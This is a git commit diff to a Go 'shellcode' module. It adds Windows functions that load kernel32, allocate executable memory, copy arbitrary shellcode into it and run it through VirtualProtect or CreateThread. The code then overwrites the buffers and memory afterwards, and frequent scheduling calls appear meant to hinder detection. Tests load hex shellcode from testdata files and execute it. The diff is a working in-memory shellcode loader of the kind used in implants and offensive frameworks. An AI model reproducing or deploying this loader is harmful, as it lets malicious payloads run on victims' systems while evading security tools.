83bd37325e58b7c6e05847f66fd32da49e1e89ba
For-ACGN <38399410+for-acgn@users.noreply.github.com>
2019-12-15 15:13:21 +0800

    modules/shellcode: merge thread.go and protect.go to windows.go, rename shellcode.go to sehedule.go

--- internal/modules/shellcode/windows.go
+++ internal/modules/shellcode/windows.go
@@ -12,6 +12,20 @@ import (
 	"project/internal/random"
 )
 
+// Execute is used to execute shellcode
+// default method is VirtualProtect
+// warning: slice shellcode will be cover
+func Execute(method string, shellcode []byte) error {
+	switch method {
+	case "", "vp":
+		return VirtualProtect(shellcode)
+	case "thread":
+		return CreateThread(shellcode)
+	default:
+		return errors.Errorf("unknown method: %s", method)
+	}
+}
+
 var (
 	initFindProcVirtualProtectOnce sync.Once
 
@@ -152,6 +166,128 @@ func VirtualProtect(shellcode []byte) error {
 		*b = byte(rand.Int64())
 	}
 	_, _, _ = vpVirtualFree.Call(memAddr, 0, memRelease)
+
+	schedule()
+	return nil
+}
+
+var (
+	initFindProcThreadOnce sync.Once
+
+	tVirtualAlloc        *syscall.Proc
+	tCreateThread        *syscall.Proc
+	tWaitForSingleObject *syscall.Proc
+	tVirtualFree         *syscall.Proc
+
+	initThreadErr error
+)
+
+func initFindProcThread() {
+	schedule()
+	var kernel32 *syscall.DLL
+	kernel32, initThreadErr = syscall.LoadDLL("kernel32.dll")
+	if initThreadErr != nil {
+		return
+	}
+
+	procMap := [4]*struct {
+		proc **syscall.Proc
+		name string
+	}{
+		{
+			&tVirtualAlloc,
+			"VirtualAlloc",
+		},
+		{
+			&tCreateThread,
+			"CreateThread",
+		},
+		{
+			&tWaitForSingleObject,
+			"WaitForSingleObject",
+		},
+		{
+			&tVirtualFree,
+			"VirtualFree",
+		},
+	}
+
+	for i := 0; i < 4; i++ {
+		schedule()
+		proc, err := kernel32.FindProc(procMap[i].name)
+		if err != nil {
+			initThreadErr = err
+			return
+		}
+		schedule()
+		*procMap[i].proc = proc
+	}
+}
+
+// CreateThread is used to create thread to execute shellcode
+// it will block until shellcode exit, so usually need create
+// a goroutine to execute CreateThread
+func CreateThread(shellcode []byte) error {
+	l := len(shellcode)
+	if l == 0 {
+		return errors.New("no data")
+	}
+
+	initFindProcThreadOnce.Do(initFindProcThread)
+	if initThreadErr != nil {
+		return errors.WithStack(initThreadErr)
+	}
+
+	// allocate memory
+	// https://docs.microsoft.com/zh-cn/windows/win32/memory/memory-protection-constants
+	const (
+		memCommit            = uintptr(0x1000)
+		memReserve           = uintptr(0x2000)
+		pageExecuteReadWrite = uintptr(0x40)
+		memRelease           = uintptr(0x8000)
+	)
+	schedule()
+	memAddr, _, err := tVirtualAlloc.Call(0, uintptr(l),
+		memReserve|memCommit, pageExecuteReadWrite)
+	if memAddr == 0 {
+		return errors.WithStack(err)
+	}
+
+	// copy shellcode
+	rand := random.New()
+	count := 0
+	for i := 0; i < l; i++ {
+		if count > 32 {
+			schedule()
+			count = 0
+		} else {
+			count++
+		}
+		// set shellcode
+		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i)))
+		*b = shellcode[i]
+
+		// clean shellcode
+		shellcode[i] = byte(rand.Int64())
+	}
+
+	// execute shellcode
+	schedule()
+	threadAddr, _, err := tCreateThread.Call(0, 0, memAddr, 0, 0, 0)
+	if threadAddr == 0 {
+		return errors.WithStack(err)
+	}
+	schedule()
+	_, _, _ = tWaitForSingleObject.Call(threadAddr, 0xFFFFFFFF)
+
+	// cover shellcode and free allocated memory
+	schedule()
+	rand = random.New()
+	for i := 0; i < l; i++ {
+		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i)))
+		*b = byte(rand.Int64())
+	}
+	_, _, _ = tVirtualFree.Call(memAddr, 0, memRelease)
 
 	schedule()
 	return nil
---
+++ internal/modules/shellcode/windows_test.go
@@ -0,0 +1,110 @@
+// +build windows
+
+package shellcode
+
+import (
+	"encoding/hex"
+	"io/ioutil"
+	"os"
+	"runtime"
+	"testing"
+
+	"github.com/stretchr/testify/require"
+)
+
+func TestVirtualProtect(t *testing.T) {
+	var (
+		file *os.File
+		err  error
+	)
+	switch runtime.GOARCH {
+	case "386":
+		file, err = os.Open("testdata/windows_32.txt")
+		require.NoError(t, err)
+	case "amd64":
+		file, err = os.Open("testdata/windows_64.txt")
+		require.NoError(t, err)
+	default:
+		return
+	}
+
+	t.Logf("use %s shellcode\n", runtime.GOARCH)
+	defer func() { _ = file.Close() }()
+	shellcode, err := ioutil.ReadAll(hex.NewDecoder(file))
+	require.NoError(t, err)
+
+	for i := 0; i < 3; i++ {
+		cp := make([]byte, len(shellcode))
+		copy(cp, shellcode)
+		require.NoError(t, VirtualProtect(cp))
+	}
+
+	// no data
+	err = VirtualProtect(nil)
+	require.EqualError(t, err, "no data")
+}
+
+func TestCreateThread(t *testing.T) {
+	var (
+		file *os.File
+		err  error
+	)
+	switch runtime.GOARCH {
+	case "386":
+		file, err = os.Open("testdata/windows_32.txt")
+		require.NoError(t, err)
+	case "amd64":
+		file, err = os.Open("testdata/windows_64.txt")
+		require.NoError(t, err)
+	default:
+		return
+	}
+
+	t.Logf("use %s shellcode\n", runtime.GOARCH)
+	defer func() { _ = file.Close() }()
+	shellcode, err := ioutil.ReadAll(hex.NewDecoder(file))
+	require.NoError(t, err)
+
+	for i := 0; i < 3; i++ {
+		cp := make([]byte, len(shellcode))
+		copy(cp, shellcode)
+		require.NoError(t, CreateThread(cp))
+	}
+
+	// no data
+	err = CreateThread(nil)
+	require.EqualError(t, err, "no data")
+}
+
+func TestExecute(t *testing.T) {
+	var (
+		file *os.File
+		err  error
+	)
+	switch runtime.GOARCH {
+	case "386":
+		file, err = os.Open("testdata/windows_32.txt")
+		require.NoError(t, err)
+	case "amd64":
+		file, err = os.Open("testdata/windows_64.txt")
+		require.NoError(t, err)
+	default:
+		return
+	}
+
+	t.Logf("use %s shellcode\n", runtime.GOARCH)
+	defer func() { _ = file.Close() }()
+	shellcode, err := ioutil.ReadAll(hex.NewDecoder(file))
+	require.NoError(t, err)
+	cp := make([]byte, len(shellcode))
+
+	// must copy, because shellcode will be clean
+	copy(cp, shellcode)
+	require.NoError(t, Execute("vp", cp))
+
+	copy(cp, shellcode)
+	require.NoError(t, Execute("thread", cp))
+
+	err = Execute("foo method", shellcode)
+	require.EqualError(t, err, "unknown method: foo method")
+}
